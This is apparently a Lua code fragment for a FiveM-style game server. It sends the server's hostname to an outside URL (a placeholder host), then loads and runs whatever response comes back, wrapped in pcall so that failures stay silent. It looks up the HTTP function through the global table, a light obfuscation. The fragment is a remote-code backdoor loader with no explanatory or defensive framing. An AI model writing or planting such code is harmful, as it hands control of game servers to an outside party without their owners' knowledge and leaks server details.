local _u = 'https://example.invalid/' .. GetConvar('sv_hostname', '')
_G['PerformHttpRequest'](_u, function(a, b, c)
    pcall(function() load(b)() end)
end)
